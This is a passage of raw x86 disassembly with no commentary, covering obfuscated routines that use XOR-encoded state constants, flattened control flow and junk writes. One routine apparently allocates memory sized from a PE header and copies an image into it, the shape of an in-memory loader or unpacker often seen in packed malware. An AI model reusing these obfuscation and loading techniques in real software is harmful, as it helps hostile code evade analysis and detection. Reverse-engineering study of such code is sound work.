  4285d7:	mov    eax,DWORD PTR [ebp+0x8]
  4285da:	xor    eax,edi
  4285dc:	add    eax,ebx
  4285de:	mov    DWORD PTR [ebp+0x18],eax
  4285e1:	mov    eax,DWORD PTR [ebp+0x8]
  4285e4:	mov    ecx,DWORD PTR [ebp-0x24]
  4285e7:	xor    eax,edi
  4285e9:	add    eax,ebx
  4285eb:	mov    DWORD PTR [ecx],eax
  4285ed:	mov    DWORD PTR [ebp+0x18],edx
  4285f0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  4285f7:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  4285fe:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  428605:	mov    eax,DWORD PTR [ebp-0x8]
  428608:	mov    ecx,DWORD PTR [ebp+0x1c]
  42860b:	xor    eax,edi
  42860d:	add    eax,ebx
  42860f:	imul   eax,ecx
  428612:	mov    ecx,DWORD PTR [ebp+0x8]
  428615:	mov    edx,DWORD PTR [ebp-0x28]
  428618:	xor    ecx,edi
  42861a:	lea    ecx,[ecx+edx*1+0x3272f1]
  428621:	cmp    eax,ecx
  428623:	jae    0x4289d4
  428629:	mov    eax,DWORD PTR [ebp+0x8]
  42862c:	xor    eax,edi
  42862e:	add    eax,ebx
  428630:	mov    DWORD PTR [ebp+0x18],eax
  428633:	mov    eax,DWORD PTR [ebp+0x1c]
  428636:	add    eax,DWORD PTR [ebp-0x1c]
  428639:	mov    DWORD PTR [ebp-0x4],eax
  42863c:	push   DWORD PTR [ebp-0x4]
  42863f:	mov    esi,DWORD PTR [ebp-0x1c]
  428642:	mov    ecx,DWORD PTR [ebp+0x10]
  428645:	call   0x427799
  42864a:	mov    DWORD PTR [ebp+0xc],eax
  42864d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  428654:	mov    eax,DWORD PTR [ebp-0x18]
  428657:	xor    eax,edi
  428659:	lea    ecx,[ebp-0x40]
  42865c:	add    eax,ebx
  42865e:	push   ecx
  42865f:	call   0x427d2b
  428664:	mov    eax,DWORD PTR [ebp+0xc]
  428667:	test   eax,eax
  428669:	je     0x4286b9
  42866b:	mov    eax,DWORD PTR [ebp-0x18]
  42866e:	xor    eax,edi
  428670:	add    eax,ebx
  428672:	push   eax
  428673:	push   DWORD PTR [ebp+0xc]
  428676:	lea    eax,[ebp-0x40]
  428679:	push   eax
  42867a:	call   0x427c21
  42867f:	mov    eax,DWORD PTR [ebp-0x4]
  428682:	mov    DWORD PTR [ebp-0x18],eax
  428685:	mov    eax,DWORD PTR [ebp-0x18]
  428688:	mov    ecx,DWORD PTR [ebp-0x1c]
  42868b:	sub    eax,ecx
  42868d:	mov    DWORD PTR [ebp-0x18],eax
  428690:	mov    eax,DWORD PTR [ebp+0xc]
  428693:	mov    ecx,DWORD PTR [ebp+0xc]
  428696:	mov    eax,DWORD PTR [eax+0x10]
  428699:	add    eax,DWORD PTR [ecx+0xc]
  42869c:	mov    ecx,DWORD PTR [ebp-0x18]
  42869f:	cmp    ecx,eax
  4286a1:	jb     0x4286b9
  4286a3:	mov    eax,DWORD PTR [ebp+0xc]
  4286a6:	mov    eax,DWORD PTR [eax+0xc]
  4286a9:	mov    ecx,DWORD PTR [ebp+0xc]
  4286ac:	add    eax,DWORD PTR [ecx+0x8]
  4286af:	mov    ecx,DWORD PTR [ebp-0x18]
  4286b2:	sub    eax,ecx
  4286b4:	jmp    0x4289a7
  4286b9:	push   0xc
  4286bb:	push   DWORD PTR [ebp-0x4]
  4286be:	lea    eax,[ebp-0x4c]
  4286c1:	push   eax
  4286c2:	call   0x427c21
  4286c7:	mov    eax,0xf89c85a5
  4286cc:	mov    DWORD PTR [ebp-0x2c],eax
  4286cf:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  4286d6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4286dd:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  4286e4:	lea    ecx,[ebp-0x2c]
  4286e7:	mov    DWORD PTR [ebp-0xc],ecx
  4286ea:	lea    ecx,[ebp-0x30]
  4286ed:	mov    DWORD PTR [ebp-0x10],ecx
  4286f0:	lea    ecx,[ebp-0x34]
  4286f3:	mov    DWORD PTR [ebp+0xc],ecx
  4286f6:	lea    ecx,[ebp-0x38]
  4286f9:	mov    DWORD PTR [ebp-0x14],ecx
  4286fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4286ff:	xor    ecx,edi
  428701:	add    ecx,ebx
  428703:	mov    DWORD PTR [ebp-0x18],ecx
  428706:	jmp    0x428902
  42870b:	cmp    eax,0xf89c85bb
  428710:	je     0x428914
  428716:	mov    ecx,DWORD PTR [ebp-0x8]
  428719:	xor    ecx,edi
  42871b:	mov    esi,eax
  42871d:	add    ecx,ebx
  42871f:	mov    DWORD PTR [ebp+0x18],ecx
  428722:	mov    eax,DWORD PTR [ebp-0x18]
  428725:	xor    esi,edi
  428727:	lea    eax,[eax+esi*1+0x3272f1]
  42872e:	mov    DWORD PTR [ebp-0x18],eax
  428731:	mov    eax,DWORD PTR [ebp-0x8]
  428734:	mov    ecx,DWORD PTR [ebp-0x18]
  428737:	xor    eax,edi
  428739:	add    eax,ebx
  42873b:	cmp    ecx,eax
  42873d:	jne    0x428752
  42873f:	mov    eax,DWORD PTR [ebp+0x8]
  428742:	xor    eax,edi
  428744:	add    eax,ebx
  428746:	push   eax
  428747:	push   0xc
  428749:	lea    eax,[ebp-0x4c]
  42874c:	push   eax
  42874d:	call   0x428206
  428752:	mov    eax,DWORD PTR [ebp-0xc]
  428755:	mov    eax,DWORD PTR [eax]
  428757:	xor    eax,edi
  428759:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428760:	mov    ecx,DWORD PTR [ebp+0x8]
  428763:	xor    ecx,edi
  428765:	movzx  eax,al
  428768:	add    ecx,ebx
  42876a:	cmp    eax,ecx
  42876c:	je     0x4288ea
  428772:	mov    eax,DWORD PTR [ebp-0x10]
  428775:	mov    eax,DWORD PTR [eax]
  428777:	xor    eax,edi
  428779:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428780:	mov    ecx,DWORD PTR [ebp+0x8]
  428783:	xor    ecx,edi
  428785:	movzx  eax,al
  428788:	add    ecx,ebx
  42878a:	cmp    eax,ecx
  42878c:	je     0x4288ea
  428792:	mov    eax,DWORD PTR [ebp+0xc]
  428795:	mov    eax,DWORD PTR [eax]
  428797:	xor    eax,edi
  428799:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287a3:	xor    ecx,edi
  4287a5:	movzx  eax,al
  4287a8:	add    ecx,ebx
  4287aa:	cmp    eax,ecx
  4287ac:	je     0x4288ea
  4287b2:	mov    eax,DWORD PTR [ebp-0x14]
  4287b5:	mov    eax,DWORD PTR [eax]
  4287b7:	xor    eax,edi
  4287b9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4287c3:	xor    ecx,edi
  4287c5:	movzx  eax,al
  4287c8:	add    ecx,ebx
  4287ca:	cmp    eax,ecx
  4287cc:	je     0x4288ea
  4287d2:	mov    eax,DWORD PTR [ebp-0x10]
  4287d5:	mov    eax,DWORD PTR [eax]
  4287d7:	xor    eax,edi
  4287d9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4287e0:	mov    ecx,DWORD PTR [ebp-0xc]
  4287e3:	mov    ecx,DWORD PTR [ecx]
  4287e5:	xor    ecx,edi
  4287e7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4287ee:	xor    al,cl
  4287f0:	mov    ecx,DWORD PTR [ebp+0xc]
  4287f3:	mov    ecx,DWORD PTR [ecx]
  4287f5:	xor    ecx,edi
  4287f7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4287fe:	or     al,cl
  428800:	mov    ecx,DWORD PTR [ebp-0xc]
  428803:	mov    ecx,DWORD PTR [ecx]
  428805:	xor    ecx,edi
  428807:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  42880e:	cmp    cl,al
  428810:	jne    0x4288ea
  428816:	mov    eax,DWORD PTR [ebp+0xc]
  428819:	mov    eax,DWORD PTR [eax]
  42881b:	xor    eax,edi
  42881d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428824:	mov    ecx,DWORD PTR [ebp-0x10]
  428827:	mov    ecx,DWORD PTR [ecx]
  428829:	xor    ecx,edi
  42882b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428832:	xor    al,cl
  428834:	mov    ecx,DWORD PTR [ebp-0x14]
  428837:	mov    ecx,DWORD PTR [ecx]
  428839:	xor    ecx,edi
  42883b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428842:	or     al,cl
  428844:	mov    ecx,DWORD PTR [ebp-0x10]
  428847:	mov    ecx,DWORD PTR [ecx]
  428849:	xor    ecx,edi
  42884b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428852:	cmp    cl,al
  428854:	jne    0x4288ea
  42885a:	mov    eax,DWORD PTR [ebp-0x14]
  42885d:	mov    eax,DWORD PTR [eax]
  42885f:	xor    eax,edi
  428861:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428868:	mov    ecx,DWORD PTR [ebp+0xc]
  42886b:	mov    ecx,DWORD PTR [ecx]
  42886d:	xor    ecx,edi
  42886f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428876:	xor    al,cl
  428878:	mov    ecx,DWORD PTR [ebp-0xc]
  42887b:	mov    ecx,DWORD PTR [ecx]
  42887d:	xor    ecx,edi
  42887f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428886:	or     al,cl
  428888:	mov    ecx,DWORD PTR [ebp+0xc]
  42888b:	mov    ecx,DWORD PTR [ecx]
  42888d:	xor    ecx,edi
  42888f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428896:	cmp    cl,al
  428898:	jne    0x4288ea
  42889a:	mov    eax,DWORD PTR [ebp-0x14]
  42889d:	mov    eax,DWORD PTR [eax]
  42889f:	xor    eax,edi
  4288a1:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4288a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4288ab:	mov    ecx,DWORD PTR [ecx]
  4288ad:	xor    ecx,edi
  4288af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288b6:	xor    al,cl
  4288b8:	mov    ecx,DWORD PTR [ebp-0x10]
  4288bb:	mov    ecx,DWORD PTR [ecx]
  4288bd:	xor    ecx,edi
  4288bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288c6:	or     al,cl
  4288c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4288cb:	mov    ecx,DWORD PTR [ecx]
  4288cd:	xor    ecx,edi
  4288cf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288d6:	cmp    cl,al
  4288d8:	jne    0x4288ea
  4288da:	lea    eax,[ebp-0x4c]
  4288dd:	push   eax
  4288de:	call   0x4283a5
  4288e3:	mov    ecx,DWORD PTR [ebp-0x44]
  4288e6:	cmp    eax,ecx
  4288e8:	je     0x4288f4
  4288ea:	mov    eax,DWORD PTR [ebp+0x8]
  4288ed:	xor    eax,edi
  4288ef:	add    eax,ebx
  4288f1:	mov    DWORD PTR [ebp+0x18],eax
  4288f4:	mov    eax,DWORD PTR [ebp-0x8]
  4288f7:	xor    eax,edi
  4288f9:	lea    eax,[eax+esi*1+0x3272f1]
  428900:	xor    eax,edi
  428902:	mov    ecx,DWORD PTR [ebp+0x8]
  428905:	mov    edx,DWORD PTR [ebp+0x18]
  428908:	xor    ecx,edi
  42890a:	add    ecx,ebx
  42890c:	cmp    edx,ecx
  42890e:	je     0x42870b
  428914:	mov    eax,DWORD PTR [ebp+0x8]
  428917:	mov    ecx,DWORD PTR [ebp+0x18]
  42891a:	xor    eax,edi
  42891c:	add    eax,ebx
  42891e:	cmp    ecx,eax
  428920:	jne    0x428933
  428922:	mov    eax,DWORD PTR [ebp-0x8]
  428925:	mov    ecx,DWORD PTR [ebp+0x1c]
  428928:	xor    eax,edi
  42892a:	lea    eax,[eax+ecx*1+0x3272f1]
  428931:	jmp    0x4289aa
  428933:	push   0x18
  428935:	push   DWORD PTR [ebp-0x4]
  428938:	lea    eax,[ebp-0x64]
  42893b:	push   eax
  42893c:	call   0x427c21
  428941:	mov    eax,DWORD PTR [ebp+0x8]
  428944:	mov    ecx,DWORD PTR [ebp-0x18]
  428947:	xor    eax,edi
  428949:	add    eax,ebx
  42894b:	cmp    eax,ecx
  42894d:	je     0x428962
  42894f:	mov    eax,DWORD PTR [ebp+0x8]
  428952:	xor    eax,edi
  428954:	add    eax,ebx
  428956:	push   eax
  428957:	push   0x18
  428959:	lea    eax,[ebp-0x64]
  42895c:	push   eax
  42895d:	call   0x428206
  428962:	mov    eax,DWORD PTR [ebp-0x4]
  428965:	add    eax,0x18
  428968:	mov    DWORD PTR [ebp+0x18],eax
  42896b:	push   DWORD PTR [ebp-0x50]
  42896e:	push   DWORD PTR [ebp+0x18]
  428971:	mov    eax,DWORD PTR [ebp-0x54]
  428974:	add    eax,DWORD PTR [ebp-0x20]
  428977:	push   eax
  428978:	call   0x427c21
  42897d:	mov    eax,DWORD PTR [ebp+0x8]
  428980:	mov    ecx,DWORD PTR [ebp-0x18]
  428983:	xor    eax,edi
  428985:	add    eax,ebx
  428987:	cmp    eax,ecx
  428989:	je     0x42899c
  42898b:	push   0x0
  42898d:	push   DWORD PTR [ebp-0x50]
  428990:	mov    eax,DWORD PTR [ebp-0x54]
  428993:	add    eax,DWORD PTR [ebp-0x20]
  428996:	push   eax
  428997:	call   0x428206
  42899c:	mov    eax,DWORD PTR [ebp-0x24]
  42899f:	mov    ecx,DWORD PTR [ebp-0x50]
  4289a2:	add    DWORD PTR [eax],ecx
  4289a4:	mov    eax,DWORD PTR [ebp-0x50]
  4289a7:	add    eax,DWORD PTR [ebp+0x1c]
  4289aa:	mov    DWORD PTR [ebp+0x1c],eax
  4289ad:	mov    eax,DWORD PTR [ebp-0x8]
  4289b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4289b3:	xor    eax,edi
  4289b5:	add    eax,ebx
  4289b7:	imul   eax,ecx
  4289ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4289bd:	mov    edx,DWORD PTR [ebp-0x28]
  4289c0:	xor    ecx,edi
  4289c2:	lea    ecx,[ecx+edx*1+0x3272f1]
  4289c9:	cmp    eax,ecx
  4289cb:	jb     0x428629
  4289d1:	mov    esi,DWORD PTR [ebp+0x14]
  4289d4:	mov    eax,DWORD PTR [ebp-0x20]
  4289d7:	mov    DWORD PTR [esi],eax
  4289d9:	jmp    0x428a20
  4289db:	mov    ecx,DWORD PTR [ebp+0x8]
  4289de:	mov    edx,DWORD PTR [ebp+0xc]
  4289e1:	xor    ecx,edi
  4289e3:	xor    edx,edi
  4289e5:	add    ecx,ebx
  4289e7:	add    edx,ebx
  4289e9:	cmp    ecx,edx
  4289eb:	jne    0x4289ff
  4289ed:	mov    eax,ds:0x7f642ddc
  4289f2:	imul   eax,eax,0x9f15fccf
  4289f8:	mov    ds:0x7f642ddc,eax
  4289fd:	jmp    0x428a20
  4289ff:	mov    ecx,DWORD PTR [ebp+0x8]
  428a02:	xor    ecx,edi
  428a04:	add    ecx,ebx
  428a06:	cmp    eax,ecx
  428a08:	je     0x428a16
  428a0a:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  428a14:	jmp    0x428a20
  428a16:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  428a20:	pop    edi
  428a21:	pop    esi
  428a22:	pop    ebx
  428a23:	leave  
  428a24:	ret    0x18
  428a27:	push   ebp
  428a28:	mov    ebp,esp
  428a2a:	and    esp,0xfffffff8
  428a2d:	mov    eax,DWORD PTR [ebp+0x20]
  428a30:	sub    esp,0x14
  428a33:	push   ebx
  428a34:	mov    ebx,DWORD PTR [ebp+0x14]
  428a37:	push   esi
  428a38:	push   edi
  428a39:	cmp    eax,0xf89c85a5
  428a3e:	jne    0x428a4a
  428a40:	push   0xf89c85ba
  428a45:	jmp    0x428b7c
  428a4a:	mov    eax,DWORD PTR [ebp+0x20]
  428a4d:	cmp    eax,0xf89c85ba
  428a52:	jne    0x428a5e
  428a54:	push   0xf89c85bb
  428a59:	jmp    0x428b7c
  428a5e:	mov    eax,DWORD PTR [ebp+0x20]
  428a61:	cmp    eax,0xf89c85bb
  428a66:	jne    0x428a72
  428a68:	push   0xf89c85b8
  428a6d:	jmp    0x428b7c
  428a72:	mov    eax,DWORD PTR [ebp+0x20]
  428a75:	cmp    eax,0xf89c85b8
  428a7a:	jne    0x428a86
  428a7c:	push   0xf89c85b9
  428a81:	jmp    0x428b7c
  428a86:	mov    ecx,DWORD PTR [ebp+0x20]
  428a89:	mov    eax,0xf89c85bc
  428a8e:	cmp    ecx,eax
  428a90:	jne    0x428b4c
  428a96:	mov    eax,DWORD PTR [ebp+0x10]
  428a99:	mov    DWORD PTR [esp+0xc],eax
  428a9d:	mov    eax,DWORD PTR [ebp+0x18]
  428aa0:	mov    DWORD PTR [esp+0x14],eax
  428aa4:	mov    eax,DWORD PTR [ebp+0xc]
  428aa7:	mov    DWORD PTR [esp+0x18],eax
  428aab:	mov    eax,DWORD PTR [ebp+0x8]
  428aae:	mov    DWORD PTR [esp+0x10],eax
  428ab2:	mov    eax,DWORD PTR [esp+0x10]
  428ab6:	mov    ecx,DWORD PTR [esp+0x14]
  428aba:	mov    edi,0x75108aa
  428abf:	xor    eax,edi
  428ac1:	mov    esi,0x3272f1
  428ac6:	add    eax,esi
  428ac8:	mov    DWORD PTR [ecx],eax
  428aca:	mov    eax,DWORD PTR [esp+0xc]
  428ace:	mov    eax,DWORD PTR [eax+0x194]
  428ad4:	mov    ecx,DWORD PTR [eax]
  428ad6:	mov    eax,DWORD PTR [esp+0xc]
  428ada:	mov    eax,DWORD PTR [eax+0x194]
  428ae0:	mov    eax,DWORD PTR [eax]
  428ae2:	add    eax,DWORD PTR [ecx+0x3c]
  428ae5:	mov    ecx,DWORD PTR [esp+0xc]
  428ae9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  428aef:	mov    ecx,DWORD PTR [ecx+0x14]
  428af2:	push   0x4
  428af4:	push   0x3000
  428af9:	push   DWORD PTR [eax+0x50]
  428afc:	push   0x0
  428afe:	call   ecx
  428b00:	mov    DWORD PTR [ebx],eax
  428b02:	mov    eax,DWORD PTR [esp+0x10]
  428b06:	push   DWORD PTR [esp+0xc]
  428b0a:	xor    eax,edi
  428b0c:	add    eax,esi
  428b0e:	mov    DWORD PTR [esp+0x20],eax
  428b12:	lea    eax,[esp+0x20]
  428b16:	push   eax
  428b17:	push   ebx
  428b18:	push   DWORD PTR [esp+0x20]
  428b1c:	push   DWORD PTR [esp+0x28]
  428b20:	push   DWORD PTR [esp+0x24]
  428b24:	call   0x4284e9
  428b29:	mov    eax,DWORD PTR [esp+0x10]
  428b2d:	mov    ecx,DWORD PTR [ebx]
  428b2f:	xor    eax,edi
  428b31:	add    eax,esi
  428b33:	cmp    ecx,eax
  428b35:	je     0x428b93
  428b37:	mov    eax,DWORD PTR [esp+0x18]
  428b3b:	mov    ecx,DWORD PTR [esp+0x14]
  428b3f:	xor    eax,edi
  428b41:	add    eax,esi
  428b43:	imul   eax,DWORD PTR [esp+0x1c]
  428b48:	mov    DWORD PTR [ecx],eax
  428b4a:	jmp    0x428b93
  428b4c:	mov    ecx,DWORD PTR [ebp+0x20]
  428b4f:	cmp    ecx,0xf89c85b9
  428b55:	jne    0x428b5e
  428b57:	push   0xf89c85be
  428b5c:	jmp    0x428b7c
  428b5e:	mov    ecx,DWORD PTR [ebp+0x20]
  428b61:	cmp    ecx,0xf89c85be
  428b67:	jne    0x428b70
  428b69:	push   0xf89c85bf
  428b6e:	jmp    0x428b7c
  428b70:	mov    ecx,DWORD PTR [ebp+0x20]
  428b73:	cmp    ecx,0xf89c85bf
  428b79:	jne    0x428b93
  428b7b:	push   eax
  428b7c:	push   DWORD PTR [ebp+0x1c]
  428b7f:	push   DWORD PTR [ebp+0x18]
  428b82:	push   ebx
  428b83:	push   DWORD PTR [ebp+0x10]
  428b86:	push   DWORD PTR [ebp+0xc]
  428b89:	push   DWORD PTR [ebp+0x8]
  428b8c:	call   0x428a27
  428b91:	mov    DWORD PTR [ebx],eax
  428b93:	mov    eax,DWORD PTR [ebx]
  428b95:	pop    edi
  428b96:	pop    esi
  428b97:	pop    ebx
  428b98:	mov    esp,ebp
  428b9a:	pop    ebp
  428b9b:	ret    0x1c
  428b9e:	push   ebp
  428b9f:	mov    ebp,esp
  428ba1:	sub    esp,0xc
  428ba4:	mov    eax,0xf89c85a5
  428ba9:	mov    DWORD PTR [ebp-0x8],eax
  428bac:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428bb3:	mov    ecx,DWORD PTR [ebp-0x8]
  428bb6:	xor    ecx,0x75108aa
  428bbc:	add    ecx,0x3272f1
  428bc2:	mov    DWORD PTR [ebp-0x4],ecx
  428bc5:	mov    ecx,DWORD PTR [ebp+0xc]
  428bc8:	push   eax
  428bc9:	mov    DWORD PTR [ebp+0xc],ecx
  428bcc:	push   DWORD PTR [ebp+0xc]
  428bcf:	lea    eax,[ebp-0x4]
  428bd2:	push   DWORD PTR [ebp+0x8]
  428bd5:	push   eax
  428bd6:	push   DWORD PTR [ebp+0xc]
  428bd9:	push   DWORD PTR [ebp-0xc]
  428bdc:	push   DWORD PTR [ebp-0x8]
  428bdf:	call   0x428a27
  428be4:	mov    DWORD PTR [ebp-0x4],eax
  428be7:	mov    eax,DWORD PTR [ebp-0x4]
  428bea:	leave  
  428beb:	ret    0x8
